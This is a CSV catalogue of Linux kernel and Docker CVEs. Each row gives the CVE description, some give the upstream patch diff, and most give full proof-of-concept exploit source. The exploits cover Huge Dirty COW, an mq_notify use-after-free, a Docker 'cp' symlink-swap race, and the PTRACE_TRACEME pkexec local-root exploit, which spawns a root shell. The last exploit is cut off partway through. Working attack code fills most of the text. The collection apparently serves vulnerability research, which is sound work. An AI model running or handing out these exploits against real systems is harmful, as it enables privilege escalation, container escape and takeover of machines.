CVE ID,CVE Link,Description,Patch,Patch Link,POC,POC Link,Writeup,Writeup Link,others
CVE-2017-1000405,https://www.opencve.io/cve/CVE-2017-1000405,"The Linux Kernel versions 2.6.38 through 4.14 have a problematic use of pmd_mkdirty() in the touch_pmd() function inside the THP implementation. touch_pmd() can be reached by get_user_pages(). In such case, the pmd will become dirty. This scenario breaks the new can_follow_write_pmd()'s logic - pmd can become dirty without going through a COW cycle. This bug is not as severe as the original ""Dirty cow"" because an ext4 file (or any other regular file) cannot be mapped using THP. Nevertheless, it does allow us to overwrite read-only huge pages. For example, the zero huge page and sealed shmem files can be overwritten (since their mapping can be populated using THP). Note that after the first write page-fault to the zero page, it will be replaced with a new fresh (and zeroed) thp.",,,"// EDB Note: Source ~ https://medium.com/bindecy/huge-dirty-cow-cve-2017-1000405-110eca132de0
// EDB Note: Source ~ https://github.com/bindecy/HugeDirtyCowPOC
// Author Note: Before running, make sure to set transparent huge pages to ""always"": 
//                      `echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled`
//

//
// The Huge Dirty Cow POC. This program overwrites the system's huge zero page.
// Compile with ""gcc -pthread main.c""
//
// November 2017
// Bindecy
//

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>    
#include <unistd.h> 
#include <sched.h>
#include <string.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h> 

#define MAP_BASE        ((void *)0x4000000)
#define MAP_SIZE        (0x200000)
#define MEMESET_VAL     (0x41)
#define PAGE_SIZE       (0x1000)
#define TRIES_PER_PAGE  (20000000)

struct thread_args {
    char *thp_map;
    char *thp_chk_map;
    off_t off;
    char *buf_to_write;
    int stop;
    int mem_fd1;
    int mem_fd2;
};

typedef void * (*pthread_proc)(void *);

void *unmap_and_read_thread(struct thread_args *args) {
    char c;
    int i;
    for (i = 0; i < TRIES_PER_PAGE && !args->stop; i++) {        
        madvise(args->thp_map, MAP_SIZE, MADV_DONTNEED); // Discard the temporary COW page.
        
        memcpy(&c, args->thp_map + args->off, sizeof(c));
        read(args->mem_fd2, &c, sizeof(c));
        
        lseek(args->mem_fd2, (off_t)(args->thp_map + args->off), SEEK_SET);
        usleep(10); // We placed the zero page and marked its PMD as dirty. 
                    // Give get_user_pages() another chance before madvise()-ing again.
    }
    
    return NULL;
}

void *write_thread(struct thread_args *args) {
    int i;
    for (i = 0; i < TRIES_PER_PAGE && !args->stop; i++) {
        lseek(args->mem_fd1, (off_t)(args->thp_map + args->off), SEEK_SET);
        madvise(args->thp_map, MAP_SIZE, MADV_DONTNEED); // Force follow_page_mask() to fail.
        write(args->mem_fd1, args->buf_to_write, PAGE_SIZE);
    }
    
    return NULL;
}

void *wait_for_success(struct thread_args *args) {
    while (args->thp_chk_map[args->off] != MEMESET_VAL) {
        madvise(args->thp_chk_map, MAP_SIZE, MADV_DONTNEED);
        sched_yield();
    }

    args->stop = 1;
    return NULL;
}

int main() {
    struct thread_args args;
    void *thp_chk_map_addr;
    int ret;

    // Mapping base should be a multiple of the THP size, so we can work with the whole huge page.
    args.thp_map = mmap(MAP_BASE, MAP_SIZE, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (args.thp_map == MAP_FAILED) {
        perror(""[!] mmap()"");
        return -1;
    }
    if (args.thp_map != MAP_BASE) {
        fprintf(stderr, ""[!] Didn't get desired base address for the vulnerable mapping.\n"");
        goto err_unmap1;
    }
    
    printf(""[*] The beginning of the zero huge page: %lx\n"", *(unsigned long *)args.thp_map);

    thp_chk_map_addr = (char *)MAP_BASE + (MAP_SIZE * 2); // MAP_SIZE * 2 to avoid merge
    args.thp_chk_map = mmap(thp_chk_map_addr, MAP_SIZE, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); 
    if (args.thp_chk_map == MAP_FAILED) {
        perror(""[!] mmap()"");
        goto err_unmap1;
    }
    if (args.thp_chk_map != thp_chk_map_addr) {
        fprintf(stderr, ""[!] Didn't get desired base address for the check mapping.\n"");
        goto err_unmap2;
    }
    
    ret = madvise(args.thp_map, MAP_SIZE, MADV_HUGEPAGE); 
    ret |= madvise(args.thp_chk_map, MAP_SIZE, MADV_HUGEPAGE);
    if (ret) {
        perror(""[!] madvise()"");
        goto err_unmap2;
    }

    args.buf_to_write = malloc(PAGE_SIZE);
    if (!args.buf_to_write) {
        perror(""[!] malloc()"");
        goto err_unmap2;
    }
    memset(args.buf_to_write, MEMESET_VAL, PAGE_SIZE);
    
    args.mem_fd1 = open(""/proc/self/mem"", O_RDWR);
    if (args.mem_fd1 < 0) {
        perror(""[!] open()"");
        goto err_free;
    }
    
    args.mem_fd2 = open(""/proc/self/mem"", O_RDWR);
    if (args.mem_fd2 < 0) {
        perror(""[!] open()"");
        goto err_close1;
    }

    printf(""[*] Racing. Gonna take a while...\n"");
    args.off = 0;

    // Overwrite every single page
    while (args.off < MAP_SIZE) {   
        pthread_t threads[3]; 
        args.stop = 0;
        
        ret = pthread_create(&threads[0], NULL, (pthread_proc)wait_for_success, &args);
        ret |= pthread_create(&threads[1], NULL, (pthread_proc)unmap_and_read_thread, &args);
        ret |= pthread_create(&threads[2], NULL, (pthread_proc)write_thread, &args);
        
        if (ret) {
            perror(""[!] pthread_create()"");
            goto err_close2;
        }
        
        pthread_join(threads[0], NULL); // This call will return only after the overwriting is done
        pthread_join(threads[1], NULL);
        pthread_join(threads[2], NULL);

        args.off += PAGE_SIZE;    
        printf(""[*] Done 0x%lx bytes\n"", args.off);
    }
    
    printf(""[*] Success!\n"");
    
err_close2:
    close(args.mem_fd2);
err_close1:
    close(args.mem_fd1);
err_free:
    free(args.buf_to_write);
err_unmap2:
    munmap(args.thp_chk_map, MAP_SIZE);
err_unmap1:
    munmap(args.thp_map, MAP_SIZE);
    
    if (ret) {
        fprintf(stderr, ""[!] Exploit failed.\n"");
    }
    
    return ret;
}",https://www.exploit-db.com/exploits/43199,,,
CVE-2017-11176,https://www.opencve.io/cve/CVE-2017-11176,"The mq_notify function in the Linux kernel through 4.11.9 does not set the sock pointer to NULL upon entry into the retry logic. During a user-space close of a Netlink socket, it allows attackers to cause a denial of service (use-after-free) or possibly have unspecified other impact.","mqueue: fix a use-after-free in sys_mq_notify()
The retry logic for netlink_attachskb() inside sys_mq_notify()
is nasty and vulnerable:

1) The sock refcnt is already released when retry is needed
2) The fd is controllable by user-space because we already
   release the file refcnt

so we when retry but the fd has been just closed by user-space
during this small window, we end up calling netlink_detachskb()
on the error path which releases the sock again, later when
the user-space closes this socket a use-after-free could be
triggered.

Setting 'sock' to NULL here should be sufficient to fix it.

Reported-by: GeneBlue <geneblue.mail@gmail.com>
Signed-off-by: Cong Wang <xiyou.wangcong@gmail.com>
Cc: Andrew Morton <akpm@linux-foundation.org>
Cc: Manfred Spraul <manfred@colorfullife.com>
Cc: stable@kernel.org
Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
Diffstat
-rw-r--r--	ipc/mqueue.c	4	
1 files changed, 3 insertions, 1 deletions
diff --git a/ipc/mqueue.c b/ipc/mqueue.c
index c9ff943f19abc6..eb1391b52c6f84 100644
--- a/ipc/mqueue.c
+++ b/ipc/mqueue.c
@@ -1270,8 +1270,10 @@ retry:
 
 			timeo = MAX_SCHEDULE_TIMEOUT;
 			ret = netlink_attachskb(sock, nc, &timeo, NULL);
-			if (ret == 1)
+			if (ret == 1) {
+				sock = NULL;
 				goto retry;
+			}
 			if (ret) {
 				sock = NULL;
 				nc = NULL;",https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f991af3daabaecff34684fd51fac80319d1baad1,"#define _GNU_SOURCE
#include <asm/types.h>
#include <mqueue.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <errno.h>
#include <stdbool.h>

#define MAX_MSGSIZE 1024
#define SOL_NETLINK (270)
#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)

struct state
{
    int ok;
    int fd;
    int close_fd;
}state;


int add_rmem_alloc(void){
    int fd1 = -1;
    int fd2 = -1;
    fd1 = socket(AF_NETLINK,SOCK_RAW,2);
    fd2 = socket(AF_NETLINK,SOCK_DGRAM,2);
    struct sockaddr_nl nladdr;
    nladdr.nl_family = AF_NETLINK;
    nladdr.nl_groups = 0;
    nladdr.nl_pad = 0;
    nladdr.nl_pid = 10;
    bind(fd1,(struct sockaddr*)&nladdr,sizeof(struct sockaddr_nl));

    struct msghdr msg;
    struct sockaddr_nl r_nladdr;
    r_nladdr.nl_pad = 0;
    r_nladdr.nl_pid = 10;
    r_nladdr.nl_family = AF_NETLINK;
    r_nladdr.nl_groups = 0;

    memset(&msg,0,sizeof(msg));
    msg.msg_name = &r_nladdr; /*address of receiver*/
    msg.msg_namelen = sizeof(nladdr);
    /* message head */
    char buffer[] = ""An example message"";
    struct nlmsghdr *nlhdr;
    nlhdr = (struct nlmsghdr*)malloc(NLMSG_SPACE(MAX_MSGSIZE));
    strcpy(NLMSG_DATA(nlhdr),buffer);
    nlhdr->nlmsg_len = NLMSG_LENGTH(strlen(buffer));/*nlmsghdr len + data len*/
    nlhdr->nlmsg_pid = getpid();  /* self pid */
    nlhdr->nlmsg_flags = 0;

    struct iovec iov;
    iov.iov_base = nlhdr;
    iov.iov_len = nlhdr->nlmsg_len;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    while (sendmsg(fd2, &msg, MSG_DONTWAIT)>0) ;
    if (errno != EAGAIN)
    {
        perror(""sendmsg"");
        exit(-5);
    }
    printf(""[*] sk_rmem_alloc > sk_rcvbuf ==> ok\n"");
    return fd1;

    return 0;    
}
static void *thread2(struct state *s){
    int fd = s->fd;
    s->ok = 1;
    sleep(3);
    close(s->close_fd);
    int optval = 1;
    if(setsockopt(fd,SOL_NETLINK,NETLINK_NO_ENOBUFS,&optval,4)){
        perror(""setsockopt "");
    }
    else{
        puts(""[*] wake up thread 1"");
    }
}
void tiger(int fd){
    pthread_t pid;
    struct state s;
    s.ok = 0;
    s.fd = fd;
    s.close_fd = dup(fd);
    if(errno = pthread_create(&pid,NULL,thread2,&s)){
        perror(""pthread_create "");
        exit(-1);
    }  
    while(!(s.ok));
    puts(""[*] mq_notify start"");
    struct sigevent sigv;
    sigv.sigev_signo = s.close_fd;
    sigv.sigev_notify = SIGEV_THREAD;
    sigv.sigev_value.sival_ptr = ""test"";
    _mq_notify((mqd_t)0x666,&sigv);
    puts(""ok"");
}
int main(){
    int fd = -1;
    fd = add_rmem_alloc();

    tiger(fd);
    puts(""ok"");
    return 0;
}",https://xz.aliyun.com/t/5358?time__1311=n4%2BxnD07itY7qAKY7KDsA3xCqxUDR7DchQOYD&alichlgref=https%3A%2F%2Fwww.google.com%2F,,https://xz.aliyun.com/t/5358?time__1311=n4%2BxnD07itY7qAKY7KDsA3xCqxUDR7DchQOYD&alichlgref=https%3A%2F%2Fwww.google.com%2F,
CVE-2017-5123,https://www.opencve.io/cve/CVE-2017-5123,Insufficient data validation in waitid allowed an user to escape sandboxes on Linux.,"waitid(): Add missing access_ok() checks
Adds missing access_ok() checks.

CVE-2017-5123

Reported-by: Chris Salls <chrissalls5@gmail.com>
Signed-off-by: Kees Cook <keescook@chromium.org>
Acked-by: Al Viro <viro@zeniv.linux.org.uk>
Fixes: 4c48abe91be0 (""waitid(): switch copyout of siginfo to unsafe_put_user()"")
Cc: stable@kernel.org # 4.13
Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
Diffstat
-rw-r--r--	kernel/exit.c	6	
1 files changed, 6 insertions, 0 deletions
diff --git a/kernel/exit.c b/kernel/exit.c
index f2cd53e92147c3..cf28528842bcf5 100644
--- a/kernel/exit.c
+++ b/kernel/exit.c
@@ -1610,6 +1610,9 @@ SYSCALL_DEFINE5(waitid, int, which, pid_t, upid, struct siginfo __user *,
 	if (!infop)
 		return err;
 
+	if (!access_ok(VERIFY_WRITE, infop, sizeof(*infop)))
+		goto Efault;
+
 	user_access_begin();
 	unsafe_put_user(signo, &infop->si_signo, Efault);
 	unsafe_put_user(0, &infop->si_errno, Efault);
@@ -1735,6 +1738,9 @@ COMPAT_SYSCALL_DEFINE5(waitid,
 	if (!infop)
 		return err;
 
+	if (!access_ok(VERIFY_WRITE, infop, sizeof(*infop)))
+		goto Efault;
+
 	user_access_begin();
 	unsafe_put_user(signo, &infop->si_signo, Efault);
 	unsafe_put_user(0, &infop->si_errno, Efault);",https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=96ca579a1ecc943b75beba58bebb0356f6cc4b51,,,,,access_ok() 是个问题
CVE-2018-15664,https://www.opencve.io/cve/CVE-2018-15664,"In Docker through 18.06.1-ce-rc2, the API endpoints behind the 'docker cp' command are vulnerable to a symlink-exchange attack with Directory Traversal, giving attackers arbitrary read-write access to the host filesystem with root privileges, because daemon/archive.go does not do archive operations on a frozen filesystem (or from within a chroot).",,,"#define _GNU_SOURCE
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <unistd.h>

#define usage() \
    do { printf(""usage: symlink_swap <symlink>\n""); exit(1); } while(0)

#define bail(msg) \
    do { perror(""symlink_swap: "" msg); exit(1); } while (0)

/* No glibc wrapper for this, so wrap it ourselves. */
#define RENAME_EXCHANGE (1 << 1)
/*int renameat2(int olddirfd, const char *oldpath,
              int newdirfd, const char *newpath, int flags)
{
    return syscall(__NR_renameat2, olddirfd, oldpath, newdirfd, newpath, flags);
}*/

/* usage: symlink_swap <symlink> */
int main(int argc, char **argv)
{
    if (argc != 2)
        usage();

    char *symlink_path = argv[1];
    char *stash_path = NULL;
    if (asprintf(&stash_path, ""%s-stashed"", symlink_path) < 0)
        bail(""create stash_path"");

    /* Create a dummy file at symlink_path. */
    struct stat sb = {0};
    if (!lstat(symlink_path, &sb)) {
        int err;
        if (sb.st_mode & S_IFDIR)
            err = rmdir(symlink_path);
        else
            err = unlink(symlink_path);
        if (err < 0)
            bail(""unlink symlink_path"");
    }

    /*
     * Now create a symlink to ""/"" (which will resolve to the host's root if we
     * win the race) and a dummy directory at stash_path for us to swap with.
     * We use a directory to remove the possibility of ENOTDIR which reduces
     * the chance of us winning.
     */
    if (symlink(""/"", symlink_path) < 0)
        bail(""create symlink_path"");
    if (mkdir(stash_path, 0755) < 0)
        bail(""mkdir stash_path"");

    /* Now we do a RENAME_EXCHANGE forever. */
    for (;;) {
        int err = renameat2(AT_FDCWD, symlink_path,
                            AT_FDCWD, stash_path, RENAME_EXCHANGE);
        if (err < 0)
            perror(""symlink_swap: rename exchange failed"");
    }
    return 0;
}",https://zhuanlan.zhihu.com/p/443811755,,,
CVE-2019-13272,https://www.opencve.io/cve/CVE-2019-13272,"In the Linux kernel before 5.1.17, ptrace_link in kernel/ptrace.c mishandles the recording of the credentials of a process that wants to create a ptrace relationship, which allows local users to obtain root access by leveraging certain scenarios with a parent-child process relationship, where a parent drops privileges and calls execve (potentially allowing control by an attacker). One contributing factor is an object lifetime issue (which can also cause a panic). Another contributing factor is incorrect marking of a ptrace relationship as privileged, which is exploitable through (for example) Polkit's pkexec helper with PTRACE_TRACEME. NOTE: SELinux deny_ptrace might be a usable workaround in some environments.","ptrace: Fix ->ptracer_cred handling for PTRACE_TRACEME
Fix two issues:

When called for PTRACE_TRACEME, ptrace_link() would obtain an RCU
reference to the parent's objective credentials, then give that pointer
to get_cred().  However, the object lifetime rules for things like
struct cred do not permit unconditionally turning an RCU reference into
a stable reference.

PTRACE_TRACEME records the parent's credentials as if the parent was
acting as the subject, but that's not the case.  If a malicious
unprivileged child uses PTRACE_TRACEME and the parent is privileged, and
at a later point, the parent process becomes attacker-controlled
(because it drops privileges and calls execve()), the attacker ends up
with control over two processes with a privileged ptrace relationship,
which can be abused to ptrace a suid binary and obtain root privileges.

Fix both of these by always recording the credentials of the process
that is requesting the creation of the ptrace relationship:
current_cred() can't change under us, and current is the proper subject
for access control.

This change is theoretically userspace-visible, but I am not aware of
any code that it will actually break.

Fixes: 64b875f7ac8a (""ptrace: Capture the ptracer's creds not PT_PTRACE_CAP"")
Signed-off-by: Jann Horn <jannh@google.com>
Acked-by: Oleg Nesterov <oleg@redhat.com>
Cc: stable@vger.kernel.org
Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
Diffstat
-rw-r--r--	kernel/ptrace.c	4	
1 files changed, 1 insertions, 3 deletions
diff --git a/kernel/ptrace.c b/kernel/ptrace.c
index 8456b6e2205f76..705887f63288d4 100644
--- a/kernel/ptrace.c
+++ b/kernel/ptrace.c
@@ -79,9 +79,7 @@ void __ptrace_link(struct task_struct *child, struct task_struct *new_parent,
  */
 static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)
 {
-	rcu_read_lock();
-	__ptrace_link(child, new_parent, __task_cred(new_parent));
-	rcu_read_unlock();
+	__ptrace_link(child, new_parent, current_cred());
 }",https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6994eefb0053799d2e07cd140df6c2ea106c41ee,"// Linux 4.10 < 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)
//
// Uses pkexec technique. Requires execution within the context
// of a user session with an active PolKit agent.
//
// Exploitation will fail if kernel.yama.ptrace_scope >= 2;
// or SELinux deny_ptrace=on.
// ---
// Original discovery and exploit author: Jann Horn
// - https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
// ---
// <bcoles@gmail.com>
// - added known helper paths
// - added search for suitable helpers
// - added automatic targeting
// - changed target suid executable from passwd to pkexec
// https://github.com/bcoles/kernel-exploits/tree/master/CVE-2019-13272
// ---
// Tested on:
// - Ubuntu 16.04.5 kernel 4.15.0-29-generic
// - Ubuntu 18.04.1 kernel 4.15.0-20-generic
// - Ubuntu 18.04.3 kernel 5.0.0-23-generic
// - Ubuntu 19.04 kernel 5.0.0-15-generic
// - Ubuntu Mate 18.04.2 kernel 4.18.0-15-generic
// - Linux Mint 17.3 kernel 4.4.0-89-generic
// - Linux Mint 18.3 kernel 4.13.0-16-generic
// - Linux Mint 19 kernel 4.15.0-20-generic
// - Xubuntu 16.04.4 kernel 4.13.0-36-generic
// - ElementaryOS 0.4.1 4.8.0-52-generic
// - Backbox 6 kernel 4.18.0-21-generic
// - Parrot OS 4.5.1 kernel 4.19.0-parrot1-13t-amd64
// - Kali kernel 4.19.0-kali5-amd64
// - MX 18.3 kernel 4.19.37-2~mx17+1
// - RHEL 8.0 kernel 4.18.0-80.el8.x86_64
// - CentOS 8 kernel 4.18.0-80.el8.x86_64
// - Debian 9.4.0 kernel 4.9.0-6-amd64
// - Debian 10.0.0 kernel 4.19.0-5-amd64
// - Devuan 2.0.0 kernel 4.9.0-6-amd64
// - SparkyLinux 5.8 kernel 4.19.0-5-amd64
// - SparkyLinux 5.9 kernel 4.19.0-6-amd64
// - Fedora Workstation 30 kernel 5.0.9-301.fc30.x86_64
// - Manjaro 18.0.3 kernel 4.19.23-1-MANJARO
// - Mageia 6 kernel 4.9.35-desktop-1.mga6
// - Antergos 18.7 kernel 4.17.6-1-ARCH
// - lubuntu 19.04 kernel 5.0.0-13-generic
// - Sabayon 19.03 kernel 4.20.0-sabayon
// - Pop! OS 19.04 kernel 5.0.0-21-generic
// ---
// [user@localhost CVE-2019-13272]$ gcc -Wall --std=gnu99 -s poc.c -o ptrace_traceme_root
// [user@localhost CVE-2019-13272]$ ./ptrace_traceme_root
// Linux 4.10 < 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)
// [.] Checking environment ...
// [~] Done, looks good
// [.] Searching policies for useful helpers ...
// [.] Ignoring helper (does not exist): /usr/sbin/pk-device-rebind
// [.] Trying helper: /usr/libexec/gsd-backlight-helper
// [.] Spawning suid process (/usr/bin/pkexec) ...
// [.] Tracing midpid ...
// [~] Attached to midpid
// [root@localhost CVE-2019-13272]# id
// uid=0(root) gid=0(root) groups=0(root),1000(user)
// [root@localhost CVE-2019-13272]# uname -a
// Linux localhost.localdomain 4.18.0-80.el8.x86_64 #1 SMP Tue Jun 4 09:19:46 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
// ---

#define _GNU_SOURCE
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <fcntl.h>
#include <sched.h>
#include <stddef.h>
#include <stdarg.h>
#include <pwd.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <linux/elf.h>

#define DEBUG

#ifdef DEBUG
#  define dprintf printf
#else
#  define dprintf
#endif

/*
 * enabled automatic targeting.
 * uses pkaction to search PolKit policy actions for viable helper executables.
 */
#define ENABLE_AUTO_TARGETING   1

/*
 * fall back to known helpers if automatic targeting fails.
 * note: use of these helpers may result in PolKit authentication
 *       prompts on the session associated with the PolKit agent.
 */
#define ENABLE_FALLBACK_HELPERS 1

static const char *SHELL = ""/bin/bash"";

static int middle_success = 1;
static int block_pipe[2];
static int self_fd = -1;
static int dummy_status;
static const char *helper_path;
static const char *pkexec_path = ""/usr/bin/pkexec"";
static const char *pkaction_path = ""/usr/bin/pkaction"";
struct stat st;

const char *helpers[1024];

/* known helpers to use if automatic targeting fails */
#if ENABLE_FALLBACK_HELPERS
const char *known_helpers[] = {
  ""/usr/lib/gnome-settings-daemon/gsd-backlight-helper"",
  ""/usr/lib/gnome-settings-daemon/gsd-wacom-led-helper"",
  ""/usr/lib/unity-settings-daemon/usd-backlight-helper"",
  ""/usr/lib/unity-settings-daemon/usd-wacom-led-helper"",
  ""/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper"",
  ""/usr/lib/x86_64-linux-gnu/cinnamon-settings-daemon/csd-backlight-helper"",
  ""/usr/sbin/mate-power-backlight-helper"",
  ""/usr/sbin/xfce4-pm-helper"",
  ""/usr/bin/xfpm-power-backlight-helper"",
  ""/usr/bin/lxqt-backlight_backend"",
  ""/usr/libexec/gsd-wacom-led-helper"",
  ""/usr/libexec/gsd-wacom-oled-helper"",
  ""/usr/libexec/gsd-backlight-helper"",
  ""/usr/lib/gsd-backlight-helper"",
  ""/usr/lib/gsd-wacom-led-helper"",
  ""/usr/lib/gsd-wacom-oled-helper"",
  ""/usr/lib64/xfce4/session/xsfm-shutdown-helper"",
};
#endif

/* helper executables known to cause problems (hang or fail) */
const char *blacklisted_helpers[] = {
  ""/xf86-video-intel-backlight-helper"",
  ""/cpugovctl"",
  ""/resetxpad"",
  ""/package-system-locked"",
  ""/cddistupgrader"",
};

#define SAFE(expr) ({                   \
  typeof(expr) __res = (expr);          \
  if (__res == -1) {                    \
    dprintf(""[-] Error: %s\n"", #expr);  \
    return 0;                           \
  }                                     \
  __res;                                \
})
#define max(a,b) ((a)>(b) ? (a) : (b))

/*
 * execveat() syscall
 * https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl
 */
#ifndef __NR_execveat
#  define __NR_execveat 322
#endif

/* temporary printf; returned pointer is valid until next tprintf */
static char *tprintf(char *fmt, ...) {
  static char buf[10000];
  va_list ap;
  va_start(ap, fmt);
  vsprintf(buf, fmt, ap);
  va_end(ap);
  return buf;
}

/*
 * fork, execute pkexec in parent, force parent to trace our child process,
 * execute suid executable (pkexec) in child.
 */
static int middle_main(void *dummy) {
  prctl(PR_SET_PDEATHSIG, SIGKILL);
  pid_t middle = getpid();

  self_fd = SAFE(open(""/proc/self/exe"", O_RDONLY));

  pid_t child = SAFE(fork());
  if (child == 0) {
    prctl(PR_SET_PDEATHSIG, SIGKILL);

    SAFE(dup2(self_fd, 42));

    /* spin until our parent becomes privileged (have to be fast here) */
    int proc_fd = SAFE(open(tprintf(""/proc/%d/status"", middle), O_RDONLY));
    char *needle = tprintf(""\nUid:\t%d\t0\t"", getuid());
    while (1) {
      char buf[1000];
      ssize_t buflen = SAFE(pread(proc_fd, buf, sizeof(buf)-1, 0));
      buf[buflen] = '\0';
      if (strstr(buf, needle)) break;
    }

    /*
     * this is where the bug is triggered.
     * while our parent is in the middle of pkexec, we force it to become our
     * tracer, with pkexec's creds as ptracer_cred.
     */
    SAFE(ptrace(PTRACE_TRACEME, 0, NULL, NULL));

    /*
     * now we execute a suid executable (pkexec).
     * Because the ptrace relationship is considered to be privileged,
     * this is a proper suid execution despite the attached tracer,
     * not a degraded one.
     * at the end of execve(), this process receives a SIGTRAP from ptrace.
     */
    execl(pkexec_path, basename(pkexec_path), NULL);

    dprintf(""[-] execl: Executing suid executable failed"");
    exit(EXIT_FAILURE);
  }

  SAFE(dup2(self_fd, 0));
  SAFE(dup2(block_pipe[1], 1));

  /* execute pkexec as current user */
  struct passwd *pw = getpwuid(getuid());
  if (pw == NULL) {
    dprintf(""[-] getpwuid: Failed to retrieve username"");
    exit(EXIT_FAILURE);
  }

  middle_success = 1;
  execl(pkexec_path, basename(pkexec_path), ""--user"", pw->pw_name,
        helper_path,
        ""--help"", NULL);
  middle_success = 0;
  dprintf(""[-] execl: Executing pkexec failed"");
  exit(EXIT_FAILURE);
}

/* ptrace pid and wait for signal */
static int force_exec_and_wait(pid_t pid, int exec_fd, char *arg0) {
  struct user_regs_struct regs;
  struct iovec iov = { .iov_base = &regs, .iov_len = sizeof(regs) };
  SAFE(ptrace(PTRACE_SYSCALL, pid, 0, NULL));
  SAFE(waitpid(pid, &dummy_status, 0));
  SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov));

  /* set up indirect arguments */
  unsigned long scratch_area = (regs.rsp - 0x1000) & ~0xfffUL;
  struct injected_page {
    unsigned long argv[2];
    unsigned long envv[1];
    char arg0[8];
    char path[1];
  } ipage = {
    .argv = { scratch_area + offsetof(struct injected_page, arg0) }
  };
  strcpy(ipage.arg0, arg0);
  int i;
  for (i = 0; i < sizeof(ipage)/sizeof(long); i++) {
    unsigned long pdata = ((unsigned long *)&ipage)[i];
    SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * sizeof(long),
                (void*)pdata));
  }

  /* execveat(exec_fd, path, argv, envv, flags) */
  regs.orig_rax = __NR_execveat;
  regs.rdi = exec_fd;
  regs.rsi = scratch_area + offsetof(struct injected_page, path);
  regs.rdx = scratch_area + offsetof(struct injected_page, argv);
  regs.r10 = scratch_area + offsetof(struct injected_page, envv);
  regs.r8 = AT_EMPTY_PATH;

  SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov));
  SAFE(ptrace(PTRACE_DETACH, pid, 0, NULL));
  SAFE(waitpid(pid, &dummy_status, 0));

  return 0;
}

static int middle_stage2(void) {
  /* our child is hanging in signal delivery from execve()'s SIGTRAP */
  pid_t child = SAFE(waitpid(-1, &dummy_status, 0));
  return force_exec_and_wait(child, 42, ""stage3"");
}

// * * * * * * * * * * * * * * * * root shell * * * * * * * * * * * * * * * * *

static int spawn_shell(void) {
  SAFE(setresgid(0, 0, 0));
  SAFE(setresuid(0, 0, 0));
  execlp(SHELL, basename(SHELL), NULL);
  dprintf(""[-] execlp: Executing shell %s failed"", SHELL);
  exit(EXIT_FAILURE);
}

// * * * * * * * * * * * * * * * * * Detect * * * * * * * * * * * * * * * * * *

static int check_env(void) {
  int warn = 0;
  const char* xdg_session = getenv(""XDG_SESSION_ID"");

  dprintf(""[.] Checking environment ...\n"");

  if (stat(pkexec_path, &st) != 0) {
    dprintf(""[-] Could not find pkexec executable at %s\n"", pkexec_path);
    exit(EXIT_FAILURE);
  }

  if (stat(""/dev/grsec"", &st) == 0) {
    dprintf(""[!] Warning: grsec is in use\n"");
    warn++;
  }

  if (xdg_session == NULL) {
    dprintf(""[!] Warning: $XDG_SESSION_ID is not set\n"");
    warn++;
  }

  if (system(""/bin/loginctl --no-ask-password show-session \""$XDG_SESSION_ID\"" | /bin/grep Remote=no >>/dev/null 2>>/dev/null"") != 0) {
    dprintf(""[!] Warning: Could not find active PolKit agent\n"");
    warn++;
  }

  if (system(""/sbin/sysctl kernel.yama.ptrace_scope 2>&1 | /bin/grep -q [23]"") == 0) {
    dprintf(""[!] Warning: kernel.yama.ptrace_scope >= 2\n"");
    warn++;
  }

  if (stat(""/usr/sbin/getsebool"", &st) == 0) {
    if (system(""/usr/sbin/getsebool deny_ptrace 2>&1 | /bin/grep -q on"") == 0) {
      dprintf(""[!] Warning: SELinux deny_ptrace is enabled\n"");
      warn++;
    }
  }

  if (warn > 0) {
    dprintf(""[~] Done, with %d warnings\n"", warn);
  } else {
    dprintf(""[~] Done, looks good\n"");
  }

  return warn;
}

/*
 * Use pkaction to search PolKit policy actions for viable helper executables.
 * Check each action for allow_active=yes, extract the associated helper path,
 * and check the helper path exists.
 */
#if ENABLE_AUTO_TARGETING
int find_helpers() {
  if (stat(pkaction_path, &st) != 0) {
    dprintf(""[-] No helpers found. Could not find pkaction executable at %s.\n"", pkaction_path);
    return 0;
  }

  char cmd[1024];
  snprintf(cmd, sizeof(cmd), ""%s --verbose"", pkaction_path);
  FILE *fp;
  fp = popen(cmd, ""r"");
  if (fp == NULL) {
    dprintf(""[-] Failed to run %s: %m\n"", cmd);
    return 0;
  }

  char line[1024];
  char buffer[2048];
  int helper_index = 0;
  int useful_action = 0;
  int blacklisted_helper = 0;
  static const char *needle = ""org.freedesktop.policykit.exec.path -> "";
  int needle_length = strlen(needle);

  while (fgets(line, sizeof(line)-1, fp) != NULL) {
    /* check the action uses allow_active=yes */
    if (strstr(line, ""implicit active:"")) {
      if (strstr(line, ""yes"")) {
        useful_action = 1;
      }
      continue;
    }

    if (useful_action == 0)
      continue;

